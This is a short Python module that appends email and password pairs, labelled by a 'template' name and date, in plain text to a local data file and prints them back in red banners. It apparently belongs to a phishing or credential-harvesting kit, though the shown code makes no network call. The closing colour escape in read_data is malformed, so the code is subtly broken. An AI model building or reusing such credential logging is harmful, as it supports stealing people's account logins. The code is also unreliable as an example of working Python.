from . import props

def save_data(template, email, password):
    file = open("Data/data.txt", "a")

    file.write(f"    {template} - {props.get_date()}\n\n")
    file.write(f"    Email: {email} \n    Password: {password}\n\n")
        
    file.close()

def read_data():
    archivo = open("Data/data.txt", "r")
    print(f"""
    \033[91m______________ DATA ______________\033[0m
    
{archivo.read()}
    \033[91m__________________________________\033[0
    """)
    archivo.close() 